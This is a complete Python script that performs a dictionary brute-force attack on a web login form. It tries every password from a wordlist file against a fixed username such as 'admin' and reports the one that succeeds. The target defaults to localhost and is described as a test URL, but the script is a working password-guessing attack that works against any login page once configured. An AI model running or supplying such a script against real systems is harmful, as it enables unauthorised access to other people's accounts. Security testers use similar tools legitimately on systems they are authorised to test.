import requests

# CONFIGURATION
TARGET_URL = "http://localhost/login"  # Change to your test login URL
USERNAME = "admin"                     # The username to attack
WORDLIST_FILE = "passwords.txt"        # File containing potential passwords (one per line)

def attempt_login(username, password):
    """
    Attempt login to the target with the given username and password.
    Modify the payload keys to match your target form's input names.
    """
    payload = {
        "username": username,  # Change key if needed
        "password": password   # Change key if needed
    }
    response = requests.post(TARGET_URL, data=payload)
    return response

def main():
    with open(WORDLIST_FILE, "r") as wordlist:
        for pwd in wordlist:
            pwd = pwd.strip()
            print(f"Trying password: {pwd}")
            resp = attempt_login(USERNAME, pwd)
            # Customize this check based on your target's response
            if "Welcome" in resp.text or resp.status_code == 302:
                print(f"Success! Password is: {pwd}")
                break
        else:
            print("Password not found in wordlist.")

if __name__ == "__main__":
    main()